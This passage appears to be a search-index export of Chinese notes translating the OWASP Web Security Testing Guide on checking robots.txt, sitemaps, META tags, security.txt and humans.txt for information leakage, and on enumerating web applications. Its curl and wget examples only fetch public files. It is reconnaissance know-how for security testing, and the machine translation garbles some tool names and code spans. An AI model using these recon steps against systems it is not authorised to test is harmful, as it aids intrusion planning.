\u4ecb\u7ecd\u5982\u4f55\u6d4b\u8bd5\u5404\u79cd\u5143\u6570\u636e\u6587\u4ef6\u662f\u5426\u5b58\u5728 Web \u5e94\u7528\u7a0b\u5e8f\u8def\u5f84\u6216\u529f\u80fd\u7684\u4fe1\u606f\u6cc4\u6f0f\u3002\u6b64\u5916\uff0c\u8718\u86db\u3001\u673a\u5668\u4eba\u6216\u722c\u866b\u8981\u907f\u514d\u7684\u76ee\u5f55\u5217\u8868\u4e5f\u53ef\u4ee5\u521b\u5efa\u4e3a\u901a\u8fc7\u5e94\u7528\u7a0b\u5e8f\u6620\u5c04\u6267\u884c\u8def\u5f84\u7684\u4f9d\u8d56\u9879\u3002\u8fd8\u53ef\u4ee5\u6536\u96c6\u5176\u4ed6\u4fe1\u606f\u4ee5\u8bc6\u522b\u653b\u51fb\u9762\u3001\u6280\u672f\u7ec6\u8282\u6216\u7528\u4e8e\u793e\u4f1a\u5de5\u7a0b\u53c2\u4e0e\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.3%E6%A3%80%E6%9F%A5%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9B%BE%E5%85%83%E6%96%87%E4%BB%B6%E6%98%AF%E5%90%A6%E6%9C%89%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#_2","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>\u901a\u8fc7\u5206\u6790\u5143\u6570\u636e\u6587\u4ef6\u8bc6\u522b\u9690\u85cf\u6216\u6df7\u6dc6\u7684\u8def\u5f84\u548c\u529f\u80fd\u3002</li> <li>\u63d0\u53d6\u5e76\u6620\u5c04\u53ef\u80fd\u5bfc\u81f4\u66f4\u597d\u5730\u4e86\u89e3\u624b\u5934\u7cfb\u7edf\u7684\u5176\u4ed6\u4fe1\u606f\u3002</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.3%E6%A3%80%E6%9F%A5%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9B%BE%E5%85%83%E6%96%87%E4%BB%B6%E6%98%AF%E5%90%A6%E6%9C%89%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#_3","title":"\u5982\u4f55\u6d4b\u8bd5","text":"<p>\u4e0b\u9762\u7528 \u6267\u884c\u7684\u4efb\u4f55\u64cd\u4f5c<code>wget</code>\u4e5f\u53ef\u4ee5\u7528 \u5b8c\u6210<code>curl</code>\u3002\u8bb8\u591a\u52a8\u6001\u5e94\u7528\u7a0b\u5e8f\u5b89\u5168\u6d4b\u8bd5 (DAST) \u5de5\u5177\uff08\u4f8b\u5982 ZAP \u548c Burp Suite\uff09\u90fd\u5305\u542b\u5bf9\u8fd9\u4e9b\u8d44\u6e90\u7684\u68c0\u67e5\u6216\u89e3\u6790\uff0c\u4f5c\u4e3a\u5176\u8718\u86db/\u722c\u866b\u529f\u80fd\u7684\u4e00\u90e8\u5206\u3002\u8fd8\u53ef\u4ee5\u4f7f\u7528\u5404\u79cdGoogle Dorks\u6216\u5229\u7528\u8bf8\u5982<code>inurl:</code>.</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.3%E6%A3%80%E6%9F%A5%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9B%BE%E5%85%83%E6%96%87%E4%BB%B6%E6%98%AF%E5%90%A6%E6%9C%89%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#_4","title":"\u673a\u5668\u4eba","text":"<p>Web Spiders\u3001Robots \u6216 Crawlers \u68c0\u7d22\u7f51\u9875\uff0c\u7136\u540e\u9012\u5f52\u904d\u5386\u8d85\u94fe\u63a5\u4ee5\u68c0\u7d22\u66f4\u591a\u7684 Web \u5185\u5bb9\u3002\u5b83\u4eec\u53ef\u63a5\u53d7\u7684\u884c\u4e3a\u7531Web \u6839\u76ee\u5f55\u4e2d\u7684robots.txt\u6587\u4ef6\u7684\u673a\u5668\u4eba\u6392\u9664\u534f\u8bae\u6307\u5b9a\u3002</p> <p>\u4f8b\u5982\uff0c\u4e0b\u9762\u5f15\u7528\u4e86 2020 \u5e74 5 \u6708 5 \u65e5\u4eceGoogle<code>robots.txt</code>\u91c7\u6837\u7684\u6587\u4ef6\u7684\u5f00\u5934\uff1a</p> <pre><code>User-agent: *\nDisallow: /search\nAllow: /search/about\nAllow: /search/static\nAllow: /search/howsearchworks\nDisallow: /sdch\n...\n</code></pre> <p>User-Agent\u6307\u4ee4\u662f\u6307\u7279\u5b9a\u7684\u7f51\u7edc\u8718\u86db/\u673a\u5668\u4eba/\u722c\u866b\u3002\u4f8b\u5982\uff0c<code>User-Agent: Googlebot</code>\u6307\u7684\u662f\u6765\u81ea\u8c37\u6b4c\u7684\u8718\u86db\uff0c\u800c<code>User-Agent: bingbot</code>\u6307\u7684\u662f\u6765\u81ea\u5fae\u8f6f\u7684\u722c\u866b\u3002<code>User-Agent: *</code>\u5728\u4e0a\u9762\u7684\u4f8b\u5b50\u4e2d\u9002\u7528\u4e8e\u6240\u6709\u7f51\u7edc\u8718\u86db/\u673a\u5668\u4eba/\u722c\u866b\u3002</p> <p>\u8be5<code>Disallow</code>\u6307\u4ee4\u6307\u5b9a\u54ea\u4e9b\u8d44\u6e90\u88ab\u8718\u86db/\u673a\u5668\u4eba/\u722c\u866b\u7981\u6b62\u3002\u5728\u4e0a\u9762\u7684\u793a\u4f8b\u4e2d\uff0c\u7981\u6b62\u4ee5\u4e0b\u5185\u5bb9\uff1a</p> <pre><code>...\nDisallow: /search\n...\nDisallow: /sdch\n...\n</code></pre> <p>\u7f51\u7edc\u8718\u86db/\u673a\u5668\u4eba/\u722c\u866b\u53ef\u4ee5\u6545\u610f\u5ffd\u7565<code>Disallow</code>\u6587\u4ef6\u4e2d\u6307\u5b9a\u7684\u6307\u4ee4<code>robots.txt</code>\u3002\u56e0\u6b64\uff0c<code>robots.txt</code>\u4e0d\u5e94\u5c06\u5176\u89c6\u4e3a\u5bf9\u7b2c\u4e09\u65b9\u8bbf\u95ee\u3001\u5b58\u50a8\u6216\u91cd\u65b0\u53d1\u5e03 Web \u5185\u5bb9\u7684\u65b9\u5f0f\u5b9e\u65bd\u9650\u5236\u7684\u673a\u5236\u3002</p> <p>\u8be5<code>robots.txt</code>\u6587\u4ef6\u662f\u4ece Web \u670d\u52a1\u5668\u7684 Web \u6839\u76ee\u5f55\u4e2d\u68c0\u7d22\u7684\u3002\u4f8b\u5982\uff0c\u8981\u4f7f\u7528or\u68c0\u7d22<code>robots.txt</code>from\u00a0\uff1a<code>www.google.com``wget``curl</code></p> <pre><code>$ curl -O -Ss http://www.google.com/robots.txt &amp;&amp; head -n5 robots.txt\nUser-agent: *\nDisallow: /search\nAllow: /search/about\nAllow: /search/static\nAllow: /search/howsearchworks\n...\n</code></pre>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.3%E6%A3%80%E6%9F%A5%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9B%BE%E5%85%83%E6%96%87%E4%BB%B6%E6%98%AF%E5%90%A6%E6%9C%89%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#google-robotstxt","title":"\u4f7f\u7528 Google \u7f51\u7ad9\u7ad9\u957f\u5de5\u5177\u5206\u6790 robots.txt","text":"<p>\u7f51\u7ad9\u6240\u6709\u8005\u53ef\u4ee5\u4f7f\u7528 Google \u7684\u201cAnalyze robots.txt\u201d\u529f\u80fd\u6765\u5206\u6790\u7f51\u7ad9\uff0c\u4f5c\u4e3a\u5176Google \u7f51\u7ad9\u7ba1\u7406\u5458\u5de5\u5177\u7684\u4e00\u90e8\u5206\u3002\u8be5\u5de5\u5177\u53ef\u4ee5\u8f85\u52a9\u6d4b\u8bd5\uff0c\u6d41\u7a0b\u5982\u4e0b\uff1a</p> <ol> <li>\u4f7f\u7528 Google \u5e10\u6237\u767b\u5f55 Google \u7f51\u7ad9\u7ad9\u957f\u5de5\u5177\u3002</li> <li>\u5728\u4eea\u8868\u677f\u4e0a\uff0c\u8f93\u5165\u8981\u5206\u6790\u7684\u7ad9\u70b9\u7684 URL\u3002</li> <li>\u5728\u53ef\u7528\u65b9\u6cd5\u4e4b\u95f4\u8fdb\u884c\u9009\u62e9\uff0c\u7136\u540e\u6309\u7167\u5c4f\u5e55\u4e0a\u7684\u8bf4\u660e\u8fdb\u884c\u64cd\u4f5c\u3002</li> </ol>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.3%E6%A3%80%E6%9F%A5%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9B%BE%E5%85%83%E6%96%87%E4%BB%B6%E6%98%AF%E5%90%A6%E6%9C%89%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#_5","title":"\u5143\u6807\u7b7e","text":"<p><code>&lt;META&gt;</code>\u6807\u8bb0\u4f4d\u4e8e<code>HEAD</code>\u6bcf\u4e2a HTML \u6587\u6863\u7684\u90e8\u5206\u5185\uff0c\u5e76\u4e14\u5728\u673a\u5668\u4eba/\u8718\u86db/\u722c\u866b\u8d77\u70b9\u4e0d\u662f\u4ece webroot \u4ee5\u5916\u7684\u6587\u6863\u94fe\u63a5\uff08\u5373\u6df1\u5c42\u94fe\u63a5\uff09\u5f00\u59cb\u7684\u60c5\u51b5\u4e0b\uff0c\u5e94\u8be5\u5728\u6574\u4e2a\u7f51\u7ad9\u4e0a\u4fdd\u6301\u4e00\u81f4\u3002Robots \u6307\u4ee4\u4e5f\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528\u7279\u5b9a\u7684META \u6807\u8bb0\u6765\u6307\u5b9a\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.3%E6%A3%80%E6%9F%A5%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9B%BE%E5%85%83%E6%96%87%E4%BB%B6%E6%98%AF%E5%90%A6%E6%9C%89%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#meta","title":"\u673a\u5668\u4eba META \u6807\u7b7e","text":"<p>\u5982\u679c\u6ca1\u6709<code>&lt;META NAME=\"ROBOTS\" ... &gt;</code>\u6761\u76ee\uff0c\u5219\u201c\u673a\u5668\u4eba\u6392\u9664\u534f\u8bae\u201d\u9ed8\u8ba4\u4e3a<code>INDEX,FOLLOW</code>\u5206\u522b\u3002\u56e0\u6b64\uff0c\u201c\u673a\u5668\u4eba\u6392\u9664\u534f\u8bae\u201d\u5b9a\u4e49\u7684\u53e6\u5916\u4e24\u4e2a\u6709\u6548\u6761\u76ee\u4ee5<code>NO...</code>ie<code>NOINDEX</code>\u548c\u4e3a\u524d\u7f00<code>NOFOLLOW</code>\u3002</p> <p>\u6839\u636e webroot \u6587\u4ef6\u4e2d\u5217\u51fa\u7684 Disallow \u6307\u4ee4\uff0c\u5728\u6bcf\u4e2a\u7f51\u9875\u4e2d\u8fdb\u884c<code>robots.txt</code>\u6b63\u5219\u8868\u8fbe\u5f0f\u641c\u7d22\uff0c\u5e76\u5c06\u7ed3\u679c\u4e0e\u200b\u200b webroot \u4e2d\u7684\u6587\u4ef6\u8fdb\u884c\u6bd4\u8f83\u3002<code>&lt;META NAME=\"ROBOTS\"``robots.txt</code></p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.3%E6%A3%80%E6%9F%A5%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9B%BE%E5%85%83%E6%96%87%E4%BB%B6%E6%98%AF%E5%90%A6%E6%9C%89%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#_6","title":"\u6742\u9879\u5143\u4fe1\u606f\u6807\u7b7e","text":"<p>\u7ec4\u7ec7\u7ecf\u5e38\u5728 Web \u5185\u5bb9\u4e2d\u5d4c\u5165\u4fe1\u606f META \u6807\u7b7e\u4ee5\u652f\u6301\u5404\u79cd\u6280\u672f\uff0c\u4f8b\u5982\u5c4f\u5e55\u9605\u8bfb\u5668\u3001\u793e\u4ea4\u7f51\u7edc\u9884\u89c8\u3001\u641c\u7d22\u5f15\u64ce\u7d22\u5f15\u7b49\u3002\u6b64\u7c7b\u5143\u4fe1\u606f\u5bf9\u4e8e\u6d4b\u8bd5\u4eba\u5458\u8bc6\u522b\u6240\u4f7f\u7528\u7684\u6280\u672f\u4ee5\u53ca\u8981\u63a2\u7d22\u7684\u5176\u4ed6\u8def\u5f84/\u529f\u80fd\u53ef\u80fd\u5f88\u6709\u4ef7\u503c\u548c\u6d4b\u8bd5\u3002\u4ee5\u4e0b\u5143\u4fe1\u606f\u662f<code>www.whitehouse.gov</code>\u5728 2020 \u5e74 5 \u6708 5 \u65e5\u901a\u8fc7\u67e5\u770b\u9875\u9762\u6e90\u68c0\u7d22\u5230\u7684\uff1a</p> <pre><code>...\n&lt;meta property=\"og:locale\" content=\"en_US\" /&gt;\n&lt;meta property=\"og:type\" content=\"website\" /&gt;\n&lt;meta property=\"og:title\" content=\"The White House\" /&gt;\n&lt;meta property=\"og:description\" content=\"We, the citizens of America, are now joined in a great national effort to rebuild our country and to restore its promise for all. \u2013 President Donald Trump.\" /&gt;\n&lt;meta property=\"og:url\" content=\"https://www.whitehouse.gov/\" /&gt;\n&lt;meta property=\"og:site_name\" content=\"The White House\" /&gt;\n&lt;meta property=\"fb:app_id\" content=\"1790466490985150\" /&gt;\n&lt;meta property=\"og:image\" content=\"https://www.whitehouse.gov/wp-content/uploads/2017/12/wh.gov-share-img_03-1024x538.png\" /&gt;\n&lt;meta property=\"og:image:secure_url\" content=\"https://www.whitehouse.gov/wp-content/uploads/2017/12/wh.gov-share-img_03-1024x538.png\" /&gt;\n&lt;meta name=\"twitter:card\" content=\"summary_large_image\" /&gt;\n&lt;meta name=\"twitter:description\" content=\"We, the citizens of America, are now joined in a great national effort to rebuild our country and to restore its promise for all. \u2013 President Donald Trump.\" /&gt;\n&lt;meta name=\"twitter:title\" content=\"The White House\" /&gt;\n&lt;meta name=\"twitter:site\" content=\"@whitehouse\" /&gt;\n&lt;meta name=\"twitter:image\" content=\"https://www.whitehouse.gov/wp-content/uploads/2017/12/wh.gov-share-img_03-1024x538.png\" /&gt;\n&lt;meta name=\"twitter:creator\" content=\"@whitehouse\" /&gt;\n...\n&lt;meta name=\"apple-mobile-web-app-title\" content=\"The White House\"&gt;\n&lt;meta name=\"application-name\" content=\"The White House\"&gt;\n&lt;meta name=\"msapplication-TileColor\" content=\"#0c2644\"&gt;\n&lt;meta name=\"theme-color\" content=\"#f5f5f5\"&gt;\n...\n</code></pre>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.3%E6%A3%80%E6%9F%A5%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9B%BE%E5%85%83%E6%96%87%E4%BB%B6%E6%98%AF%E5%90%A6%E6%9C%89%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#_7","title":"\u7ad9\u70b9\u5730\u56fe","text":"<p>\u7ad9\u70b9\u5730\u56fe\u662f\u4e00\u4e2a\u6587\u4ef6\uff0c\u5f00\u53d1\u4eba\u5458\u6216\u7ec4\u7ec7\u53ef\u4ee5\u5728\u5176\u4e2d\u63d0\u4f9b\u6709\u5173\u7ad9\u70b9\u6216\u5e94\u7528\u7a0b\u5e8f\u63d0\u4f9b\u7684\u9875\u9762\u3001\u89c6\u9891\u548c\u5176\u4ed6\u6587\u4ef6\u7684\u4fe1\u606f\uff0c\u4ee5\u53ca\u5b83\u4eec\u4e4b\u95f4\u7684\u5173\u7cfb\u3002\u641c\u7d22\u5f15\u64ce\u53ef\u4ee5\u4f7f\u7528\u6b64\u6587\u4ef6\u66f4\u667a\u80fd\u5730\u63a2\u7d22\u60a8\u7684\u7f51\u7ad9\u3002\u6d4b\u8bd5\u4eba\u5458\u53ef\u4ee5\u4f7f\u7528<code>sitemap.xml</code>\u6587\u4ef6\u6765\u4e86\u89e3\u6709\u5173\u7ad9\u70b9\u6216\u5e94\u7528\u7a0b\u5e8f\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u4ece\u800c\u66f4\u5168\u9762\u5730\u63a2\u7d22\u5b83\u3002</p> <p>\u4ee5\u4e0b\u6458\u5f55\u81ea 2020 \u5e74 5 \u6708 5 \u65e5\u68c0\u7d22\u5230\u7684 Google \u4e3b\u8981\u7ad9\u70b9\u5730\u56fe\u3002</p> <pre><code>$ wget --no-verbose https://www.google.com/sitemap.xml &amp;&amp; head -n8 sitemap.xml\n2020-05-05 12:23:30 URL:https://www.google.com/sitemap.xml [2049] -&gt; \"sitemap.xml\" [1]\n\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;sitemapindex xmlns=\"http://www.google.com/schemas/sitemap/0.84\"&gt;\n  &lt;sitemap&gt;\n    &lt;loc&gt;https://www.google.com/gmail/sitemap.xml&lt;/loc&gt;\n  &lt;/sitemap&gt;\n  &lt;sitemap&gt;\n    &lt;loc&gt;https://www.google.com/forms/sitemaps.xml&lt;/loc&gt;\n  &lt;/sitemap&gt;\n...\n</code></pre> <p>\u6d4b\u8bd5\u4eba\u5458\u53ef\u80fd\u5e0c\u671b\u4ece\u90a3\u91cc\u63a2\u7d22\u4ee5\u68c0\u7d22 gmail \u7ad9\u70b9\u5730\u56fe<code>https://www.google.com/gmail/sitemap.xml</code>\uff1a</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\" xmlns:xhtml=\"http://www.w3.org/1999/xhtml\"&gt;\n  &lt;url&gt;\n    &lt;loc&gt;https://www.google.com/intl/am/gmail/about/&lt;/loc&gt;\n    &lt;xhtml:link href=\"https://www.google.com/gmail/about/\" hreflang=\"x-default\" rel=\"alternate\"/&gt;\n    &lt;xhtml:link href=\"https://www.google.com/intl/el/gmail/about/\" hreflang=\"el\" rel=\"alternate\"/&gt;\n    &lt;xhtml:link href=\"https://www.google.com/intl/it/gmail/about/\" hreflang=\"it\" rel=\"alternate\"/&gt;\n    &lt;xhtml:link href=\"https://www.google.com/intl/ar/gmail/about/\" hreflang=\"ar\" rel=\"alternate\"/&gt;\n...\n</code></pre>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.3%E6%A3%80%E6%9F%A5%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9B%BE%E5%85%83%E6%96%87%E4%BB%B6%E6%98%AF%E5%90%A6%E6%9C%89%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#txt","title":"\u5b89\u5168TXT","text":"<p>security.txt\u88ab IETF \u6279\u51c6\u4e3aRFC 9116 - \u4e00\u79cd\u6709\u52a9\u4e8e\u5b89\u5168\u6f0f\u6d1e\u62ab\u9732\u7684\u6587\u4ef6\u683c\u5f0f\uff0c\u5141\u8bb8\u7f51\u7ad9\u5b9a\u4e49\u5b89\u5168\u7b56\u7565\u548c\u8054\u7cfb\u65b9\u5f0f\u3002\u6709\u591a\u79cd\u539f\u56e0\u53ef\u80fd\u5bf9\u6d4b\u8bd5\u573a\u666f\u611f\u5174\u8da3\uff0c\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\uff1a</p> <ul> <li>\u8bc6\u522b\u8fdb\u4e00\u6b65\u7684\u8def\u5f84\u6216\u8d44\u6e90\u4ee5\u5305\u542b\u5728\u53d1\u73b0/\u5206\u6790\u4e2d\u3002</li> <li>\u5f00\u6e90\u60c5\u62a5\u6536\u96c6\u3002</li> <li>\u67e5\u627e\u6709\u5173 Bug Bounties \u7b49\u7684\u4fe1\u606f\u3002</li> <li>\u793e\u4f1a\u5de5\u7a0b\u5b66\u3002</li> </ul> <p>\u8be5\u6587\u4ef6\u53ef\u80fd\u5b58\u5728\u4e8e\u7f51\u7edc\u670d\u52a1\u5668\u7684\u6839\u76ee\u5f55\u4e2d\u6216<code>.well-known/</code>\u76ee\u5f55\u4e2d\u3002\u524d\u4efb\uff1a</p> <ul> <li><code>https://example.com/security.txt</code></li> <li><code>https://example.com/.well-known/security.txt</code></li> </ul> <p>\u8fd9\u662f\u4ece LinkedIn 2020 \u5e74 5 \u6708 5 \u65e5\u68c0\u7d22\u5230\u7684\u771f\u5b9e\u793a\u4f8b\uff1a</p> <pre><code>$ wget --no-verbose https://www.linkedin.com/.well-known/security.txt &amp;&amp; cat security.txt\n2020-05-07 12:56:51 URL:https://www.linkedin.com/.well-known/security.txt [333/333] -&gt; \"security.txt\" [1]\n# Conforms to IETF `draft-foudil-securitytxt-07`\nContact: mailto:security@linkedin.com\nContact: https://www.linkedin.com/help/linkedin/answer/62924\nEncryption: https://www.linkedin.com/help/linkedin/answer/79676\nCanonical: https://www.linkedin.com/.well-known/security.txt\nPolicy: https://www.linkedin.com/help/linkedin/answer/62924\n</code></pre>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.3%E6%A3%80%E6%9F%A5%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9B%BE%E5%85%83%E6%96%87%E4%BB%B6%E6%98%AF%E5%90%A6%E6%9C%89%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#txt_1","title":"\u4eba\u7c7b TXT","text":"<p><code>humans.txt</code>\u662f\u4e00\u4e2a\u4e86\u89e3\u7f51\u7ad9\u80cc\u540e\u7684\u4eba\u7684\u5021\u8bae\u3002\u5b83\u91c7\u7528\u6587\u672c\u6587\u4ef6\u7684\u5f62\u5f0f\uff0c\u5176\u4e2d\u5305\u542b\u6709\u5173\u4e3a\u6784\u5efa\u7f51\u7ad9\u505a\u51fa\u8d21\u732e\u7684\u4e0d\u540c\u4eba\u5458\u7684\u4fe1\u606f\u3002\u8be5\u6587\u4ef6\u901a\u5e38\uff08\u4f46\u4e0d\u603b\u662f\uff09\u5305\u542b\u6709\u5173\u804c\u4e1a\u6216\u5de5\u4f5c\u5730\u70b9/\u8def\u5f84\u7684\u4fe1\u606f\u3002</p> <p>\u4ee5\u4e0b\u793a\u4f8b\u68c0\u7d22\u81ea Google 2020 \u5e74 5 \u6708 5 \u65e5\uff1a</p> <pre><code>$ wget --no-verbose  https://www.google.com/humans.txt &amp;&amp; cat humans.txt\n2020-05-07 12:57:52 URL:https://www.google.com/humans.txt [286/286] -&gt; \"humans.txt\" [1]\nGoogle is built by a large team of engineers, designers, researchers, robots, and others in many different sites across the globe. It is updated continuously, and built with more tools and technologies than we can shake a stick at. If you'd like to help us out, see careers.google.com.\n</code></pre>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.3%E6%A3%80%E6%9F%A5%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9B%BE%E5%85%83%E6%96%87%E4%BB%B6%E6%98%AF%E5%90%A6%E6%9C%89%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#_8","title":"\u5176\u4ed6\u4f17\u6240\u5468\u77e5\u7684\u4fe1\u606f\u6765\u6e90","text":"<p>\u8fd8\u6709\u5176\u4ed6 RFC \u548c Internet \u8349\u6848\u5efa\u8bae\u5728<code>.well-known/</code>\u76ee\u5f55\u4e2d\u5bf9\u6587\u4ef6\u8fdb\u884c\u6807\u51c6\u5316\u4f7f\u7528\u3002\u53ef\u4ee5\u5728\u6b64\u5904\u6216\u6b64\u5904\u627e\u5230\u5176\u4e2d\u7684\u5217\u8868\u3002</p> <p>\u6d4b\u8bd5\u4eba\u5458\u67e5\u770b RFC/\u8349\u7a3f\u5e76\u521b\u5efa\u4e00\u4e2a\u5217\u8868\u4ee5\u63d0\u4f9b\u7ed9\u722c\u866b\u6216\u6a21\u7cca\u5668\uff0c\u4ee5\u9a8c\u8bc1\u6b64\u7c7b\u6587\u4ef6\u7684\u5b58\u5728\u6216\u5185\u5bb9\uff0c\u8fd9\u5c06\u662f\u76f8\u5f53\u7b80\u5355\u7684\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.3%E6%A3%80%E6%9F%A5%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9B%BE%E5%85%83%E6%96%87%E4%BB%B6%E6%98%AF%E5%90%A6%E6%9C%89%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#_9","title":"\u5de5\u5177","text":"<ul> <li>\u6d4f\u89c8\u5668\uff08\u67e5\u770b\u6e90\u4ee3\u7801\u6216\u5f00\u53d1\u5de5\u5177\u529f\u80fd\uff09</li> <li>\u5377\u66f2</li> <li>wget</li> <li>\u6253\u55dd\u5957\u4ef6</li> <li>ZAP</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.4%E6%9E%9A%E4%B8%BE%20Web%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/","title":"1.4\u679a\u4e3e Web \u670d\u52a1\u5668\u4e0a\u7684\u5e94\u7528\u7a0b\u5e8f","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.4%E6%9E%9A%E4%B8%BE%20Web%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/#_1","title":"\u6982\u62ec","text":"<p>\u6d4b\u8bd5 Web \u5e94\u7528\u7a0b\u5e8f\u6f0f\u6d1e\u7684\u6700\u91cd\u8981\u6b65\u9aa4\u662f\u627e\u51fa Web \u670d\u52a1\u5668\u4e0a\u6258\u7ba1\u4e86\u54ea\u4e9b\u7279\u5b9a\u5e94\u7528\u7a0b\u5e8f\u3002\u8bb8\u591a\u5e94\u7528\u7a0b\u5e8f\u90fd\u6709\u5df2\u77e5\u7684\u6f0f\u6d1e\u548c\u5df2\u77e5\u7684\u653b\u51fb\u7b56\u7565\uff0c\u53ef\u4ee5\u5229\u7528\u8fd9\u4e9b\u6f0f\u6d1e\u548c\u653b\u51fb\u7b56\u7565\u6765\u83b7\u5f97\u8fdc\u7a0b\u63a7\u5236\u6216\u5229\u7528\u6570\u636e\u3002\u6b64\u5916\uff0c\u8bb8\u591a\u5e94\u7528\u7a0b\u5e8f\u7ecf\u5e38\u914d\u7f6e\u9519\u8bef\u6216\u672a\u66f4\u65b0\uff0c\u56e0\u4e3a\u4eba\u4eec\u8ba4\u4e3a\u5b83\u4eec\u4ec5\u5728\u201c\u5185\u200b\u200b\u90e8\u201d\u4f7f\u7528\uff0c\u56e0\u6b64\u4e0d\u5b58\u5728\u5a01\u80c1\u200b\u200b\u3002\u968f\u7740\u865a\u62df Web \u670d\u52a1\u5668\u7684\u6fc0\u589e\uff0cIP \u5730\u5740\u548c Web \u670d\u52a1\u5668\u4e4b\u95f4\u4f20\u7edf\u7684 1:1 \u5173\u7cfb\u6b63\u5728\u5931\u53bb\u5176\u539f\u6709\u7684\u5927\u90e8\u5206\u610f\u4e49\u3002\u591a\u4e2a\u7f51\u7ad9\u6216\u5e94\u7528\u7a0b\u5e8f\u7684\u7b26\u53f7\u540d\u79f0\u89e3\u6790\u4e3a\u540c\u4e00 IP \u5730\u5740\u7684\u60c5\u51b5\u5e76\u4e0d\u5c11\u89c1\u3002\u8fd9\u79cd\u573a\u666f\u4e0d\u4ec5\u9650\u4e8e\u6258\u7ba1\u73af\u5883\uff0c\u4e5f\u9002\u7528\u4e8e\u666e\u901a\u7684\u4f01\u4e1a\u73af\u5883\u3002</p> <p>\u5b89\u5168\u4e13\u4e1a\u4eba\u5458\u6709\u65f6\u4f1a\u83b7\u5f97\u4e00\u7ec4 IP \u5730\u5740\u4f5c\u4e3a\u6d4b\u8bd5\u76ee\u6807\u3002\u6709\u4e89\u8bae\u7684\u662f\uff0c\u6b64\u573a\u666f\u66f4\u7c7b\u4f3c\u4e8e\u6e17\u900f\u6d4b\u8bd5\u7c7b\u578b\u7684\u53c2\u4e0e\uff0c\u4f46\u65e0\u8bba\u5982\u4f55\uff0c\u9884\u8ba1\u6b64\u7c7b\u4efb\u52a1\u5c06\u6d4b\u8bd5\u53ef\u901a\u8fc7\u6b64\u76ee\u6807\u8bbf\u95ee\u7684\u6240\u6709 Web \u5e94\u7528\u7a0b\u5e8f\u3002\u95ee\u9898\u662f\u7ed9\u5b9a\u7684 IP \u5730\u5740\u5728\u7aef\u53e3 80 \u4e0a\u6258\u7ba1 HTTP \u670d\u52a1\uff0c\u4f46\u662f\u5982\u679c\u6d4b\u8bd5\u4eba\u5458\u5e94\u8be5\u901a\u8fc7\u6307\u5b9a IP \u5730\u5740\uff08\u8fd9\u662f\u4ed6\u4eec\u6240\u77e5\u9053\u7684\uff09\u8bbf\u95ee\u5b83\uff0c\u5b83\u4f1a\u62a5\u544a\u201c\u6b64\u5730\u5740\u672a\u914d\u7f6e Web \u670d\u52a1\u5668\u201d\u6216\u7c7b\u4f3c\u6d88\u606f.\u00a0\u4f46\u662f\u8be5\u7cfb\u7edf\u53ef\u4ee5\u201c\u9690\u85cf\u201d\u8bb8\u591a\u4e0e\u4e0d\u76f8\u5173\u7684\u7b26\u53f7 (DNS) \u540d\u79f0\u5173\u8054\u7684 Web 